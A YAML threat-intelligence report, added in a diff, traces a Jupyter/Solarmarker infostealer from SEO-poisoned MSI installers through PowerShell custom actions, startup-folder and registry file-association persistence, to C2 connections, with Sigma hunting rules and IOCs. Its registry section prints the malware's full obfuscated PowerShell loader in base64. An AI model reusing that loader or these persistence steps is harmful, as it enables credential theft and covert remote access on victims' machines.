@@ -1,0 +1,330 @@
+---
+header:
+  sightingReportId: 1d55b53d-42fa-4a23-8302-129e48877921
+  status: wip
+  description: This Threat Sighting documents initial infection of Jupyter Infostealer/Backdoor InfoStealer. Jupyter (a.k.a. Solarmarker, Polazert, YellowCockatoo) targets primarily Chromium, Firefox, and Chrome browser data and has backdoor/RAT capabilities. Jupyter stealer was bundled with the installer of commercial sofware tool (Nitro Pro 13). Likely the malicious installer was distributed via Search Engine Optimization (SEO) poisoning. This Threat Sightings combines results of open source / public intel with analysis of our telemetry.
+  author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)
+  acknowledgement: Nadav Lorber @ morphisec
+  tlp: white
+  threatInformation:
+    adversaries:
+    - n/d
+    malware:
+    - Jupyter
+    tools:
+    - powershell.exe
+    - chrome.exe
+    lolbas:
+    - msiexec.exe
+    regions:
+      - Northern Europe:
+          - United Kingdom of Great Britain
+      - Latin America:
+          - Chile
+          - Peru
+      - Western Europe:
+          - Germany
+      - Northern America:
+          - Canada
+          - United States of America
+      - Southern Europe:
+          - Italy
+      - Western Asia:
+          - Turkey
+    industries:
+    - Repairs and Maintenance
+    - IT
+    - Manufacturer
+    - Insurance
+    - Healthcare
+    - Oil
+    - Satellite Television
+    - Social development
+    - Education
+    - Financial
+    - CyberSecurity
+    - Telecommunications
+    - Services
+    - Software
+    - Government
+threatSightings:
+  - sighting: Initial Access - Threat Actor used _Search Engine Optimization poisoning_ to lure victims to download compromissed installers for Initial Access.
+    id: ee647c9e-edc5-44f4-9da3-37456b7a6b17
+    behaviors:
+      - behavior: User is disguised to download a malicious installer via Search Engine Optimization (SEO) poisoning
+        type: File Created
+        id: bec324e5-ee90-4c39-a944-65dd12080b88
+        weapon: chrome
+        files:
+          - name: Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi
+            sha256: bc7986f0c9f431b839a13a9a0dfa2711f86e9e9afbed9b9b456066602881ba71
+            path: "*\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"
+          - name: Medical-Engagement-Scale-Questionnaire.msi
+            path: "*\\Medical-Engagement-Scale-Questionnaire.msi"
+          - name: Due-Diligence-Checklist-For-Oil-And-Gas-Properties.msi
+            path: "*\\Due-Diligence-Checklist-For-Oil-And-Gas-Properties.msi"
+          - name: Non-Renewal-Of-Lease-Letter-To-Landlord-From-Tenant.msi
+            path: "*\\Non-Renewal-Of-Lease-Letter-To-Landlord-From-Tenant.msi"
+          - name: Fedex-Tracking-By-Shipper-Receipt.msi
+            path: "*\\Fedex-Tracking-By-Shipper-Receipt.msi"
+          - name: Christian-Doctrine-Clauses-List.msi
+            path: "*\\Christian-Doctrine-Clauses-List.msi"
+          - name: Omnicell-Cabinet-User-Manual.msi
+            path: "*\\Omnicell-Cabinet-User-Manual.msi"
+          - name: Wells-Fargo-Subpoena-Processing-Department-Phoenix-Az.msi
+            path: "*\\Wells-Fargo-Subpoena-Processing-Department-Phoenix-Az.msi"
+          - name: Bulgarian Power Burst Training pdf.msiapp.msi
+            path: "*\\Bulgarian Power Burst Training pdf.msiapp.msi"
+          - name: Mcat-Accommodations-Personal-Statement-Example.msi
+            path: "*\\Mcat-Accommodations-Personal-Statement-Example.msi"
+        notes:
+        - Drive-By download is a social engineering attack technique in which users download a malicious file on their devices unknowingly.
+        - Solarmarker Remote Access Trojan is known to be delivered via Search Engine Optimization (SEO) poisoning.
+        - SEO poisoning is an old attacking technique in which threat actors create malicious websites and make them appear on top in search results.
+        - MSI is an installer package file format used by Windows.
+        - This MSI file is generated with Advanced Installer, an all-in-one Application Packaging Tool for Software Developers and IT Professionals.
+        att&ck:
+          initialAccess:
+          - "T1189 - Drive-by Compromise"
+  - sighting: Initial Access - Threat Actor used malicious _.MSI_ files to lure victims for Execution.
+    id: f7fb1e7d-5849-497d-b76c-984fcb01cf99
+    behaviors:
+      - behavior: User executed the .MSI file to launch installation, which was handled by MSIEXEC.
+        type: Process Created
+        id: 479a5c64-cd36-4d83-bb38-60784e6fb58f
+        weapon: msiexec
+        processes:
+          - process: C:\\Windows\\System32\\msiexec.exe
+            parentProcess: C:\\Windows\\explorer.exe
+            cmdLine:
+            - '"C:\\Windows\\System32\\msiexec.exe" /i "C:\\Users\\#{user}\\Desktop\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"'
+        notes:
+        - MsiExec.exe is the executable program of the Windows Installer used to interpret installation packages and install products.
+        - Parameter /i installs or configures a product
+        att&ck:
+          execution:
+          - "T1204 - User Execution"
+          defenseEvasion:
+          - "T1218.007 - Signed Binary Proxy Execution: Msiexec"
+      - behavior: Two files were dropped. The first one is a valid Nitro Pro 13 installer, the second one is the PowerShellScriptLauncer.dll used to execute PowerShell scripts.
+        type: File Created
+        id: f3281099-676e-4b19-b40c-3e0340d3709b
+        weapon: msiexec
+        files:
+          - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\MSI2C32.tmp # Nitro executable nitro_pro13.exe
+            name: MSI2C32.tmp
+            sha256: e4492ccb97078cc32ee4437404ce04f4404884800a81fb34243d0a64936f82d7
+            process: C:\\Windows\\System32\\msiexec.exe
+          - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\MSI2C33.tmp # PowerShellScriptLauncher.dll
+            name: MSI2C33.tmp
+            sha256: 55434961c0b4bed88ae6bfe6e0e61a3a3dcc392858f0e53c6c14c272200203ed
+            process: C:\\Windows\\System32\\msiexec.exe
+        notes:
+        - The nitro executable is only to make the victim believe that it is a normal installation.
+        - PowerShellScriptLauncher.dll is part of Advanced Installer an all-in-one Application Packaging Tool for Software Developers and IT Professionals.
+        - PowerShellScriptLauncher.dll is used to launch PowerShell custom actions during MSI installation.
+      - behavior: MsiExec.exe executed with /V parameter (installer service process).
+        type: Process Created
+        id: 9e207520-455b-41bb-9d4d-9d6443c1ac53
+        weapon: msiexec
+        processes:
+          - process: C:\\Windows\\System32\\msiexec.exe
+            cmdLine:
+            - C:\\Windows\\System32\\msiexec.exe /V
+        notes:
+        - This is the Windows Installer service process
+      - behavior: MsiExec.exe is executed with -Embedding parameter (in order to execute the malicious CustomAction of the MSI file)
+        type: Process Created
+        id: 07cd7030-ea5a-4ed1-9f40-03deffe3f587
+        weapon: msiexec
+        processes:
+          - parentProcess:  C:\\Windows\\System32\\msiexec.exe # 9e207520-455b-41bb-9d4d-9d6443c1ac53
+            process: C:\\Windows\\System32\\msiexec.exe
+            cmdLine:
+            - C:\\Windows\\system32\\MsiExec.exe -Embedding E1719003B1274EAD56C181C06EC4D717 C
+        notes:
+        - This is the custom action server (indicated by the -Embedding switch)
+        - The parentProcess is the last one. id:9e207520-455b-41bb-9d4d-9d6443c1ac53
+      - behavior: MsiExec.exe drops different files.
+        type: File Created
+        id: 33a9da2a-d51f-4aa3-80ac-a47ce152e323
+        weapon: msiexec
+        files:
+          - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\scr2C81.ps1
+            name: scr2C81.ps1
+            sha256: e34af1b6edf33b155ca9854d084577c30e1bc9d96eee10014277a0e55a47beef # scr2C81.ps1
+            process: C:\\Windows\\System32\\msiexec.exe
+          - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\msi2C71.txt
+            name: msi2C71.txt
+            sha256: n/d
+            process: C:\\Windows\\System32\\msiexec.exe
+          - path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\pss2C93.ps1
+            name: pss2C93.ps1
+            sha256: 88748aae11029228d84aef0855f4bc084dfd70450db1f7029746d8bc85182f93 # pss2C93.ps1
+            process: C:\\Windows\\System32\\msiexec.exe
+        notes:
+        - These files are dropped from the attribute CustomAction of the MSI file
+  - sighting: Execution - Threat Actor used _.MSI_ Custom Actions to launch _PowerShell_ script for Execution.
+    id: 123b1e7d-5849-497d-b76c-984fcb01cf99
+    behaviors:
+      - behavior: Installer executed a CustomAction to launch a malicious PowerShell inline script.
+        type: Process Created
+        id: cf3af6eb-a6df-4e76-a78e-9f721b2de3e1
+        weapon: powershell
+        processes:
+          - parentProcess:  C:\\Windows\\System32\\msiexec.exe # 07cd7030-ea5a-4ed1-9f40-03deffe3f587
+            process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+            cmdLine:
+            - ' -NoProfile -Noninteractive -ExecutionPolicy Bypass -File "C:\\Users\\#{user}\AppData\\Local\\Temp\\pss2C93.ps1" -propFile "C:\\Users\\#{user}\\AppData\\Local\\Temp\\msi2C71.txt" -scriptFile "C:\\Users\\#{user}\\AppData\\Local\\Temp\\scr2C81.ps1" -scriptArgsFile "C:\\Users\\#{user}\\AppData\\Local\\Temp\\scr2C82.txt" -propSep " :<->: " -testPrefix "_testValue."'
+        notes:
+        - This script is the CustomAction of the first MSI installer.
+        - These files executed were dropped before for the final MSI execution id:07cd7030-ea5a-4ed1-9f40-03deffe3f587
+        att&ck:
+          execution:
+          - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+  - sighting: Execution - Threat Actor used _PowerShell_ to drop _.LNK_ files into Windows Start Up folder for Persistence.
+    id: 965f7550-25f3-477e-b70a-c0337ddf7136
+    behaviors:
+      - behavior: PowerShell dropped malicious .LNK file to Windows StartUp folder
+        type: File Created
+        id: 55e27253-397a-4c2c-8423-af21c40ec86c
+        weapon: powershell
+        files:
+          - name: aad8174b5ff4d3bc9e9443812d0b0.lnK
+            process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+            path: 'C:\\Users\\#{user}\\AppData\\Roaming\\miCroSoFt\\WINDOwS\\stARt MENU\\PRogrAMs\\staRtuP\\aad8174b5ff4d3bc9e9443812d0b0.lnK'
+        notes:
+        - LNK files are shortcut files used by Microsoft Windows
+        att&ck:
+          persistence:
+          - "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+          execution:
+          - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+  - sighting: Execution - Threat Actor used _PowerShell_ to modify file association in Windows Registry for Persistence.
+    id: 9c083554-ed20-47ac-9f4b-945440af59d8
+    behaviors:
+      - behavior: PowerShell modified default file association to execute highly obfuscated PowerShell command.
+        type: RegValue Created
+        id: 9d723cbe-9bec-46a0-8e01-8cf576e073e7
+        weapon: powershell
+        registries:
+          - keyName: HKEY_CLASSES_ROOT\\nnfjzceglbgu\\shell\\open\\command
+            keyValueName: command
+            keyValue: 'PoWERShEll -WiNdOwstyLe hiDDeN -eP BYPAss -coMMAND  *REDACTED* [SySteM.Io.FiLE]::ReadALlBYTES *REDACTED* [sYstEm.reFleCTion.ASSEmBLY]::loaD($aacf08db5c6491ba0455a2adeca33);[maRS.deIMOS]::InTerACt()'
+            process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+        notes:
+        - Full registry value encoded b64 -  UG9XRVJTaEVsbCAtV2lOZE93c3R5TGUgaGlERGVOIC1lUCBCWVBBc3MgLWNvTU1BTkQgIiRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMT0nWGpGcGNuNUFlMmQ1Wmo0MGZtbExibGw0YUd0clFYSitiRzVXSzI5cWVITlRRaXB4VENFeVRHeEVkbkpYZUROeVlESnpSanRhUjJzckxYY3RhMFF0YURabmZXeEhQbmhnZDBsa2FVaHlRRlpyUEQ1QWRWa21abDR4YUhCOFFHQjdVMEplVFhSRFlsNVBWWGh6UUh4RFlGZEFVeVk0ZFY1UWMySllYbTUwYlhkQWRUQTBaMEI3Y0hNd1FIeENOWDVlVVdaV0tsNXZOamxFUUg1NVozRkFVMk5KU0Y0d1kzdDMnOyRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMz1bU3lTdGVNLklvLkZpTEVdOjpSZWFkQUxsQllURVMoJ0M6XFVzZXJzXGFkbWluXEFwcERhdGFcUm9hbWluZ1xNSWNST3NPRlRcVUpJakJUQ3JYZlx0bkhhaWJXT0FrTklSRkdlLmlvQXNLUlBTZUZybmpYR09WYU0nKTtmT1IoJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhPTA7JGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhIC1sVCAkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMuQ091TnQ7KXtmb1IoJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPTA7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkIC1sVCAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDEubEVuZ3RoOyRhNjQyYjYzMGViYzQxM2JkM2MyZTIzZThmZDQyZCsrKXskYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXT0kYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXSAtYnhPUiAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDFbJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkXTskYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmErKztpZigkYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmEgLUdFICRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMy5jb1VOVCl7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPSRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMS5MRU5nVGh9fX07W3NZc3RFbS5yZUZsZUNUaW9uLkFTU0VtQkxZXTo6bG9hRCgkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMpO1ttYVJTLmRlSU1PU106OkluVGVyQUN0KCkiCgo=
+        - randomized file extension nnfjzceglbgu
+        - this file association will cause the execution of the highly obfuscated PowerShell command when the file extension is used
+        - System.Reflection.Assembly is used for execution.
+        att&ck:
+          persistence:
+          - "T1112 - Modify Registry"
+          - "T1546.001 - Event Triggered Execution: Change Default File Association"
+          defenseEvasion:
+          - "T1027 - Obfuscated Files or Information"
+          execution:
+          - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+  - sighting: Execution - Threat Actor used _PowerShell_ to drive network connections to C2 server for Command And Control.
+    id: 9e274527-31e3-438a-a401-81f05e8a29e1
+    behaviors:
+      - behavior: PowerShell drives network connection attempts to C2 server.
+        type: Network Accessed
+        id: 79e977da-da06-43c7-a2e3-72593f60ec4b
+        weapon: powershell
+        connections:
+          - dstIp: 37.120.237[.]251
+            dstPort: 80
+            protocol: tcp
+            direction: outbound
+            method: POST
+            process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+          - dstIp: 45.42.201[.]248
+            dstPort: 80
+            protocol: tcp
+            direction: outbound
+            method: POST
+            process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+        notes:
+        - These connections seems to be the C2 channel established between the powershell execution and the actor
+        - IP addresses correspond to Romania
+        att&ck:
+          commandAndControl:
+          - "T1071.001 - Application Layer Protocol: Web Protocols"
+          execution:
+          - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+threatHunting:
+  - query: Hunt for PowerShell execution as MsiExec CustomAction
+    queryId: b0b1533a-20f5-41b9-b0e0-847a271b029e
+    type: sigma
+    behaviorIds:
+    - cf3af6eb-a6df-4e76-a78e-9f721b2de3e1
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection:
+            ParentImage|endswith:
+              - '\\msiexec.exe'
+        selection2:
+            Image|endswith: '\\powershell.exe'
+            commandLine|contains|all:
+              - ' -propFile '
+              - ' -propSep '
+              - ' -scriptArgsFile '
+              - ' -File '
+        condition: selection and selection2
+  - query: Hunt for Jupyter highly obfuscated PowerShell commands
+    queryId: a42f964c-5f30-4aa7-a5e8-5f30db03907f
+    type: sigma
+    behaviorIds:
+    - 9d723cbe-9bec-46a0-8e01-8cf576e073e7
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection:
+            Image|endswith: '\\powershell.exe'
+            commandLine|contains|all:
+              - 'PoWERShEll -WiNdOwstyLe hiDDeN -eP BYPAss -coMMAND'
+        selection2:
+            Image|endswith: '\\powershell.exe'
+            commandLine|contains|all:
+              - 'SySteM.Io.FiLE'
+              - 'ReadALlBYTES'
+              - 'sYstEm.reFleCTion.ASSEmBLY'
+        selection3:
+            Image|endswith: '\\powershell.exe'
+            commandLine|contains:
+              - 'InTerACt'
+              - 'Run'
+        condition: selection OR (selection2 AND selection3)
+iocs:
+  - behaviorIds:
+    - 479a5c64-cd36-4d83-bb38-60784e6fb58f
+    indicators:
+    - sha256: bc7986f0c9f431b839a13a9a0dfa2711f86e9e9afbed9b9b456066602881ba71
+  - behaviorIds:
+    - 79e977da-da06-43c7-a2e3-72593f60ec4b
+    indicators:
+    - ipv4: 37.120.237[.]251
+  - behaviorIds:
+    - 33a9da2a-d51f-4aa3-80ac-a47ce152e323
+    indicators:
+    - sha256: e34af1b6edf33b155ca9854d084577c30e1bc9d96eee10014277a0e55a47beef
+    - sha256: 88748aae11029228d84aef0855f4bc084dfd70450db1f7029746d8bc85182f93
+footer:
+  changeTracking:
+    created: 2021-09-22
+    lastModified: 2022-03-17
+    sightingVersion: 1.7
+    schemaVersion: 1.7
+  references:
+  - https://blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer
+  - https://app.any.run/tasks/907ef6c5-5fb6-4af7-acf6-d74b413fe1d2/
+  - https://app.any.run/tasks/d8c1f63c-4048-44fa-8dd2-978cd467fd8e/
+  - https://www.esentire.com/blog/solarmarker-shifts-infrastructure-in-recent-drive-by-attacks
+  - https://squiblydoo.blog/2021/09/18/solarmarker-registry-key-persistence-walkthrough/
+  - https://squiblydoo.blog/2021/06/20/mars-deimos-from-jupiter-to-mars-and-back-again-part-two/
+  - https://twitter.com/MsftSecIntel/status/1403461398810685440
+  - Internal hunting
